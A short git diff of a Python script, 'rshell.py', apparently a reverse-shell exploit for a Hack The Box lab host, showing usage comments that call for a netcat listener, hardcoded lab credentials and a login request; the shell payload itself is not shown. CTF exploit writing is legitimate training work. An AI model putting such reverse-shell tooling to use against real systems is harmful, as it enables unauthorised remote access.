@@ -1,4 +1,5 @@
-# Usage: python3 rshell.py LocalIP local_port
+# Usage: python3 rshell.py LocalIP local_port 
+# setup : run a netcat listener
 # waraning: before you run the script make sure your host file contain the target hostname
 # Author : @akhil0x8
 
@@ -18,7 +19,7 @@ class rshell:
 		self.container_url = f"http://rainycloud.htb/containers"
 		self.auth = {"username":"gary","password":"rubberducky"}
 
-    # Post request for user login
+    # Post request for user logint4
 	def UserLogin(self):
 		r = session.post(url=self.login_url,data=self.auth)
 		print("[+] Login as user gary")
